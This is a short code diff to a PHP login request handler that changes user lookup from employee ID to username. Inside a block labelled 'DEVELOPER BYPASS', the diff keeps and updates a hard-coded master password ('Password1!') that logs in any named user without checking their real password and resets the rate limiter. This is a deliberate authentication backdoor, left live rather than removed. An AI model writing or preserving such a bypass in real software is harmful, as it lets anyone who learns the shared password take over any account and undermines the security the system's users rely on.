@@ -63,7 +63,7 @@ class LoginRequest extends FormRequest
 
         // DEVELOPER BYPASS
         if ($password === "Password1!") {
-             $user = AdmUser::where('employee_id', $username)->first();
+             $user = AdmUser::where('username', $username)->first();
              if ($user) {
                  Auth::login($user, $this->boolean('remember'));
                  RateLimiter::clear($this->throttleKey());
@@ -71,7 +71,7 @@ class LoginRequest extends FormRequest
              }
         }
 
-        if (! Auth::attempt(['employee_id' => $username, 'password' => $password], $this->boolean('remember'))) {
+        if (! Auth::attempt(['username' => $username, 'password' => $password], $this->boolean('remember'))) {
             RateLimiter::hit($this->throttleKey());
 
             throw ValidationException::withMessages([
